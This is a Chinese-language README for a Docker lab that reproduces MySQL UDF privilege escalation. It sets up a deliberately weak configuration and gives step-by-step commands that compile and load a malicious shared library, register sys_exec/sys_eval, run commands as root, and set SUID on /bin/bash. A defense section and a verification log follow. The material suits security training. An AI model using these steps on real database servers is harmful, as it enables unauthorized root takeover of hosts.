# MySQL UDF 提权

## 原理

UDF（User Defined Function，用户自定义函数）：MySQL 允许加载共享库（.so）注册
自定义函数。攻击链：

```
拿到 MySQL root (弱口令/SQL注入/配置泄露)
  -> 查看 plugin_dir 插件目录
  -> 恶意 .so 写入 plugin 目录 (FILE 权限 + INTO DUMPFILE, 或直接写入)
  -> CREATE FUNCTION 注册恶意函数 (sys_exec/sys_eval)
  -> SELECT sys_exec('命令') 以 mysqld 进程权限执行系统命令
  -> mysqld 以 root 运行 -> 直接 root 提权
```

关键前提：1) MySQL root 权限（或 FILE+INSERT） 2) 能向 plugin_dir 写文件
（secure_file_priv 为空） 3) **mysqld 以 root 运行**（默认配置常如此，本环境已配置）

## 环境

- 基础镜像：ubuntu:20.04（MySQL 8.0.42 + gcc + libmysqlclient-dev）
- 低权限用户：lowpriv / lowpriv123
- MySQL root 密码：root（可远程连接）
- 漏洞配置：secure_file_priv 为空 / plugin 目录 777 / mysqld 以 root 运行

## 复现步骤

```bash
# 1. 构建并启动
docker compose up -d --build

# 2. 进入低权限用户
docker exec -it $(docker compose ps -q) su - lowpriv

# 3. 连接 MySQL (弱口令)
mysql -h 127.0.0.1 -u root -proot
# 预期: mysql> 提示符

# 4. 确认 plugin 目录与 secure_file_priv
SHOW VARIABLES LIKE 'plugin_dir';
# 预期: /usr/lib/mysql/plugin
SHOW VARIABLES LIKE 'secure_file_priv';
# 预期: 空 (可任意写文件)

# 5. 编译 UDF 库 (源码见 udf_exec.c)
gcc -shared -fPIC -I/usr/include/mysql -o udf_exec.so udf_exec.c

# 6. 上传到 plugin 目录
cp udf_exec.so /usr/lib/mysql/plugin/

# 7. 注册函数
mysql -uroot -proot -e "CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf_exec.so';"
mysql -uroot -proot -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf_exec.so';"

# 8. 验证命令执行 (mysqld 以 root 运行!)
mysql -uroot -proot -e "SELECT sys_eval('id');"
# 预期输出: uid=0(root) gid=0(root)   提权成功!

# 9. 给 bash 加 SUID 并验证
mysql -uroot -proot -e "SELECT sys_exec('chmod u+s /bin/bash');"
/bin/bash -p -c 'id'
# 预期输出: euid=0(root)

# 10. 一键利用
bash exploit.sh
```

## 实机验证踩坑记录（重要）

| 问题 | 根因 | 修复 |
|:---|:---|:---|
| mysqld 不以 root 运行 | 1) mysqld_safe 的 user=root 反而不传 --user 参数 2) 默认配置 user=mysql 参数首个生效覆盖 --user=root | sed 替换默认配置 + mysqld --user=root --daemonize 直启 |
| MySQL root 密码认证失败 | MySQL 8.0 root@localhost 默认 auth_socket 插件 | ALTER USER ... IDENTIFIED WITH mysql_native_password BY 'root' |
| lowpriv 连不上 MySQL | /var/run/mysqld 目录 700 | chmod 755 /var/run/mysqld |
| udf_exec.c 编译失败 | Ubuntu 20.04 的 libmysqlclient-dev 是 8.0, 已移除 my_bool 类型 | #define my_bool bool 兼容 |

## 防御

- MySQL 不以 root 运行
- 强密码 + 禁止 FILE 权限: REVOKE FILE ON *.* FROM 'user'
- secure_file_priv 限制到专用目录
- 定期检查: SELECT * FROM mysql.func;

## 验证记录

2026-08-26 真实环境验证：`SELECT sys_eval('id')` 输出 `uid=0(root) gid=0(root) groups=0(root)`，
`sys_exec('chmod u+s /bin/bash')` 成功，`/bin/bash -p -c 'id'` 输出 `euid=0(root)`。复现成功。
